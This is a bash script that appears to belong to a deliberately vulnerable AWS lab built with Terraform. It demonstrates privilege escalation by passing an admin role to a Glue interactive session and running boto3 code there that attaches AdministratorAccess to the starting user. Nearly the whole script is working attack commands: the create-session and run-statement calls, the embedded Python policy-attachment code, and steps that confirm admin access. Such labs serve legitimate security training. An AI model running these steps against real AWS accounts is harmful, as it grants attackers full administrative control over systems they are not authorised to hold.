#!/bin/bash

# Demo script for iam:PassRole + glue:CreateSession + glue:RunStatement privilege escalation
# This script demonstrates how a user with PassRole and Glue Interactive Session permissions
# can escalate to admin by creating a session with an admin role and running code to attach
# AdministratorAccess to themselves


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-glue-007-to-admin-starting-user"
ADMIN_ROLE="pl-prod-glue-007-to-admin-admin-role"

# Generate random suffix for session ID
RANDOM_SUFFIX=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)
SESSION_ID="pl-glue-007-demo-session-${RANDOM_SUFFIX}"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Glue CreateSession + RunStatement Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_glue_007_iam_passrole_glue_createsession_glue_runstatement.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify lack of admin permissions
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Create Glue Interactive Session with admin role
echo -e "${YELLOW}Step 5: Creating Glue Interactive Session with admin role${NC}"
use_starting_creds
echo "This is the privilege escalation vector - passing the admin role to Glue..."
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Session ID: $SESSION_ID"
echo ""

echo -e "${BLUE}Note: Creating a Glue Interactive Session. This may take 1-2 minutes to initialize.${NC}"
echo ""

show_attack_cmd "Attacker" "aws glue create-session --region \"$AWS_REGION\" --id \"$SESSION_ID\" --role \"$ADMIN_ROLE_ARN\" --command '{\"Name\":\"glueetl\",\"PythonVersion\":\"3\"}' --glue-version \"4.0\" --worker-type \"G.1X\" --number-of-workers 2 --output json"
aws glue create-session \
    --region "$AWS_REGION" \
    --id "$SESSION_ID" \
    --role "$ADMIN_ROLE_ARN" \
    --command '{"Name":"glueetl","PythonVersion":"3"}' \
    --glue-version "4.0" \
    --worker-type "G.1X" \
    --number-of-workers 2 \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created Glue Interactive Session with admin role!${NC}"
else
    echo -e "${RED}Error: Failed to create Glue Interactive Session${NC}"
    exit 1
fi
echo ""

# [OBSERVATION] Step 6: Wait for session to be ready
echo -e "${YELLOW}Step 6: Waiting for Glue Interactive Session to be ready${NC}"
use_readonly_creds
echo "Monitoring session status (checking every 10 seconds)..."

MAX_WAIT=300  # 5 minutes
ELAPSED=0

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws glue get-session --region \"$AWS_REGION\" --id \"$SESSION_ID\" --query 'Session.Status' --output text"
    SESSION_STATUS=$(aws glue get-session \
        --region "$AWS_REGION" \
        --id "$SESSION_ID" \
        --query 'Session.Status' \
        --output text 2>/dev/null)

    echo "  [${ELAPSED}s] Session status: $SESSION_STATUS"

    if [ "$SESSION_STATUS" = "READY" ]; then
        echo -e "${GREEN}✓ Glue Interactive Session is ready!${NC}\n"
        break
    elif [ "$SESSION_STATUS" = "FAILED" ] || [ "$SESSION_STATUS" = "STOPPED" ] || [ "$SESSION_STATUS" = "TIMEOUT" ]; then
        echo -e "${RED}✗ Glue session failed with status: $SESSION_STATUS${NC}"
        echo "Fetching error details..."
        aws glue get-session \
            --region "$AWS_REGION" \
            --id "$SESSION_ID" \
            --query 'Session.ErrorMessage' \
            --output text
        exit 1
    fi

    sleep 10
    ELAPSED=$((ELAPSED + 10))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}✗ Timeout: Session did not become ready within expected time${NC}"
    exit 1
fi

# [EXPLOIT] Step 7: Run statement to attach AdministratorAccess to starting user
echo -e "${YELLOW}Step 7: Running statement to attach AdministratorAccess to starting user${NC}"
use_starting_creds
echo "Using boto3 within the Glue session to attach admin policy..."

# Create the Python code to execute
PYTHON_CODE="import boto3
iam = boto3.client('iam')
try:
    iam.attach_user_policy(
        UserName='${STARTING_USER}',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    print('SUCCESS: AdministratorAccess attached to ${STARTING_USER}!')
except Exception as e:
    print(f'ERROR: {e}')"

# Run the statement
show_attack_cmd "Attacker" "aws glue run-statement --region \"$AWS_REGION\" --session-id \"$SESSION_ID\" --code \"$PYTHON_CODE\" --output json"
STATEMENT_OUTPUT=$(aws glue run-statement \
    --region "$AWS_REGION" \
    --session-id "$SESSION_ID" \
    --code "$PYTHON_CODE" \
    --output json)

STATEMENT_ID=$(echo "$STATEMENT_OUTPUT" | jq -r '.Id')

if [ -z "$STATEMENT_ID" ] || [ "$STATEMENT_ID" = "null" ]; then
    echo -e "${RED}Error: Failed to run statement${NC}"
    exit 1
fi

echo "Statement ID: $STATEMENT_ID"
echo -e "${GREEN}✓ Statement submitted successfully${NC}\n"

# [OBSERVATION] Step 8: Wait for statement to complete
echo -e "${YELLOW}Step 8: Waiting for statement to complete${NC}"
use_readonly_creds
echo "Monitoring statement status..."

MAX_WAIT=120  # 2 minutes
ELAPSED=0

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws glue get-statement --region \"$AWS_REGION\" --session-id \"$SESSION_ID\" --id \"$STATEMENT_ID\" --query 'Statement.State' --output text"
    STATEMENT_STATUS=$(aws glue get-statement \
        --region "$AWS_REGION" \
        --session-id "$SESSION_ID" \
        --id "$STATEMENT_ID" \
        --query 'Statement.State' \
        --output text 2>/dev/null)

    echo "  [${ELAPSED}s] Statement status: $STATEMENT_STATUS"

    if [ "$STATEMENT_STATUS" = "AVAILABLE" ]; then
        echo -e "${GREEN}✓ Statement completed successfully!${NC}"

        # Get the output
        STATEMENT_RESULT=$(aws glue get-statement \
            --region "$AWS_REGION" \
            --session-id "$SESSION_ID" \
            --id "$STATEMENT_ID" \
            --query 'Statement.Output.Data.TextPlain' \
            --output text 2>/dev/null)

        if [ -n "$STATEMENT_RESULT" ] && [ "$STATEMENT_RESULT" != "None" ]; then
            echo "Statement output: $STATEMENT_RESULT"
        fi
        echo ""
        break
    elif [ "$STATEMENT_STATUS" = "ERROR" ] || [ "$STATEMENT_STATUS" = "CANCELLED" ]; then
        echo -e "${RED}✗ Statement failed with status: $STATEMENT_STATUS${NC}"
        echo "Fetching error details..."
        aws glue get-statement \
            --region "$AWS_REGION" \
            --session-id "$SESSION_ID" \
            --id "$STATEMENT_ID" \
            --query 'Statement.Output' \
            --output json
        exit 1
    fi

    sleep 5
    ELAPSED=$((ELAPSED + 5))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}✗ Timeout: Statement did not complete within expected time${NC}"
    exit 1
fi

# Step 9: Wait for IAM policy to propagate
echo -e "${YELLOW}Step 9: Waiting for IAM policy changes to propagate${NC}"
echo "IAM changes can take up to 15 seconds to be effective..."
sleep 15
echo -e "${GREEN}✓ Policy propagation complete${NC}\n"

# [OBSERVATION] Step 10: Verify admin access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
use_readonly_creds
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Created Glue Interactive Session with admin role: $ADMIN_ROLE"
echo "3. Ran Python statement using boto3 within the session"
echo "4. Statement attached AdministratorAccess to starting user"
echo "5. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (iam:PassRole + glue:CreateSession)"
echo -e "  → Glue Interactive Session with $ADMIN_ROLE"
echo -e "  → (glue:RunStatement with boto3)"
echo -e "  → (iam:AttachUserPolicy) → Admin Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Glue Interactive Session: $SESSION_ID"
echo "- Policy Attachment: AdministratorAccess on $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The following resources are still deployed:${NC}"
echo -e "${RED}  - Glue Interactive Session: $SESSION_ID${NC}"
echo -e "${RED}  - AdministratorAccess policy attached to starting user${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
